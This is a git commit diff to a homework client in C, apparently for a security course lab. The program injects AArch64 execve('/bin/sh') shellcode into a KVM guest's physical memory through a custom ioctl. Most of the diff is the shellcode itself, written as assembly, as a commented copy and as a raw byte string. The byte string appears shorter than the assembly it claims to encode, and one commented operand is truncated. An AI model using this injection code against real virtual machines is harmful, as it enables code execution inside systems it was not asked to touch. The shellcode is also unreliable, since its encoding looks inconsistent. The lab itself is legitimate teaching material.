a21e9bb99a0a7e57117e5aff3ee734e639e82604
leon123858 <a0970785699@gmail.com>
2023-04-06 07:46:40 +0000

    edit hw2 2-2

--- hw2/client/client.c
+++ hw2/client/client.c
@@ -18,34 +18,53 @@ struct kvm_arm_write_gpa_args {
 #define KVMIO 0xAE
 #define KVM_ARM_WRITE_GPA         _IOW(KVMIO,   0xfe, struct kvm_arm_write_gpa_args)
 
-extern void shellcode();
-__asm__(".global shellcode\n"
-	"shellcode:\n\t"
-	/* push b'/bin///sh\x00' */
-	/* Set x14 = 8299904519029482031 = 0x732f2f2f6e69622f */
-	"mov  x14, #25135\n\t"
-	"movk x14, #28265, lsl #16\n\t"
-	"movk x14, #12079, lsl #0x20\n\t"
-	"movk x14, #29487, lsl #0x30\n\t"
-	"mov  x15, #104\n\t"
-	"stp x14, x15, [sp, #-16]!\n\t"
-	/* execve(path='sp', argv=0, envp=0) */
-	"mov  x0, sp\n\t"
-	"mov  x1, xzr\n\t"
-	"mov  x2, xzr\n\t"
-	/* call execve() */
-	"mov  x8, #221\n\t" // SYS_execve
-	"svc 0");
+/*
+.global shellcode
+shellcode:
+mov  x14, #25135
+movk x14, #28265, lsl #16
+movk x14, #12079, lsl #0x20
+movk x14, #29487, lsl #0x
+mov  x15, #104
+stp x14, x15, [sp, #-16]!
+mov  x0, sp
+mov  x1, xzr
+mov  x2, xzr
+mov  x8, #221
+svc 0
+*/
+
+// extern void shellcode();
+// __asm__(".global shellcode\n"
+// 	"shellcode:\n\t"
+// 	/* push b'/bin///sh\x00' */
+// 	/* Set x14 = 8299904519029482031 = 0x732f2f2f6e69622f */
+// 	"mov  x14, #25135\n\t"
+// 	"movk x14, #28265, lsl #16\n\t"
+// 	"movk x14, #12079, lsl #0x20\n\t"
+// 	"movk x14, #29487, lsl #0x30\n\t"
+// 	"mov  x15, #104\n\t"
+// 	"stp x14, x15, [sp, #-16]!\n\t"
+// 	/* execve(path='sp', argv=0, envp=0) */
+// 	"mov  x0, sp\n\t"
+// 	"mov  x1, xzr\n\t"
+// 	"mov  x2, xzr\n\t"
+// 	/* call execve() */
+// 	"mov  x8, #221\n\t" // SYS_execve
+// 	"svc 0");
+
+const char shellcode[] = "\xee\x45\x8c\xd2\x2e\xcd\xad\xf2\xee\xe5\xc5\xf2\xee\x3f\xbf\xa9\xe0\x03\x00\x91\xe1\x03\x1f\xaa\xe2\x03\x1f\xaa\xa8\x1b\x80\xd2\x01\x00\x00\xd4";
 
 int main(int argc, char *argv[])
 {
 	struct kvm_arm_write_gpa_args wgpa = {
                 .vmid = 1,
                 .gpa = 0x000000080,
-		.data = (unsigned long)&shellcode,
-                .size = 20,
+		.data = (unsigned long)shellcode,
+                .size = sizeof(shellcode),
 	};
 	// TODO: implement your shellcode injection attack
+        // printf("get size of shell code: %lu\n",wgpa.size);
         int fd;
         int32_t value, number;
         printf("*********************************\n");
